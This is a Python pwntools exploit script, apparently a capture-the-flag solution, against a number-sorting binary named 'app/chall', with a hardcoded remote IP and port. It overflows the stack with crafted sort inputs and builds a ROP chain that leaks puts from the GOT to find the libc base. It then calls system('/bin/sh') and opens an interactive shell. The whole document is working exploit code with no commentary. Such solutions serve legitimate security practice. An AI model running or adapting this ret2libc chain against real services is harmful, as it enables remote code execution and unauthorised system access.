#!/usr/bin/env python3

from pwn import *

PATH = 'app/chall'

HOST = 'localhost'
HOST = '103.167.136.89'
PORT = 10022

GDBSCRIPT = '''
set resolve-heap-via-heuristic on
b *main+396
'''

def debug(r):
    if type(r) == process:
        gdb.attach(r, GDBSCRIPT)

def do_sort(numbers, next = False):
    info(f'Sorting {len(numbers)} numbers...')
    r.sendlineafter(b'How many numbers do you have?\n', f'{len(numbers)}'.encode())
    for num in numbers:
        r.sendlineafter(b': ', f'{num}'.encode())
    
    r.sendlineafter(b'Do you want to sort more numbers? (y/n)\n', b'y' if next else b'n')
        

def exploit(r):
    # debug(r)
    # pause()
    
    pop_rdi_ret = 0x401573
    
    base_number = [1 for _ in range(23)] # numbers + rbp
    
    do_sort(base_number + [1, 1, 1, elf.sym.main], next = True)
    do_sort(base_number + [1, 1, elf.sym.puts], next = True)
    do_sort(base_number + [1, elf.got.puts], next = True)
    do_sort(base_number + [pop_rdi_ret])
    
    r.recvline()
    r.recvline()
    
    puts = u64(r.recv(6).ljust(8, b'\0'))
    libc.address = puts - libc.sym.puts
    
    info(f'puts: {hex(puts)}')
    info(f'libc: {hex(libc.address)}')
    
    str_bin_sh = next(libc.search(b'/bin/sh'))
    
    do_sort(base_number + [1, 1, 1, libc.sym.system], next = True)
    do_sort(base_number + [1, 1, pop_rdi_ret + 1], next = True)
    do_sort(base_number + [1, str_bin_sh], next = True)
    do_sort(base_number + [pop_rdi_ret])
    
    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH, checksec=True)
    libc = ELF('./libc.so.6', checksec=False)
    
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = elf.process(aslr=False, env={})
    exploit(r)